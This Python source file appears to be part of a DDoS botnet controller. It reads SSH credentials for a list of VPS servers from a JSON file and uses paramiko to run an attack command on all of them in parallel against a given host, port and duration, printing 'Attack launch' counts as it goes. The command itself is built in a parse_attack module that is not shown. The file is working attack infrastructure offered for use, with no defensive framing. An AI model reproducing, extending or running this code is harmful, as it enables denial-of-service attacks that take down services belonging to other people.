import paramiko
import json
import time
import threading
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed

from .parse_attack import parse_command

success_counter = 0
counter_lock = threading.Lock()

def execute_command_on_vps(command, server):
    global success_counter
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(server['hostname'], port=22, username=server['username'], password=server['password'])
        stdin, stdout, stderr = ssh.exec_command(command)
        stdout.channel.recv_exit_status()
        with counter_lock:
            success_counter += 1
            print(f"[System] Attack launch => {success_counter}/{total_servers}")
    except Exception as e:
        print(Fore.RED, f"[Warning] Kesalahan eksekusi perintah di {server['hostname']}: {e}", Fore.RESET)
    finally:
        ssh.close()
        time.sleep(1)

def launch_attacks(method, host, port, duration):
    global success_counter
    global total_servers
    
    success_counter = 0
    
    cmd = parse_command(method, host, port, duration)

    with open('./data/vps_servers.json') as file:
        data = json.load(file)

    total_servers = len(data)
    max_workers = min(32, total_servers)
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(execute_command_on_vps, cmd, server) for server in data]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Kesalahan dalam thread: {e}")
    
    success_counter = 0
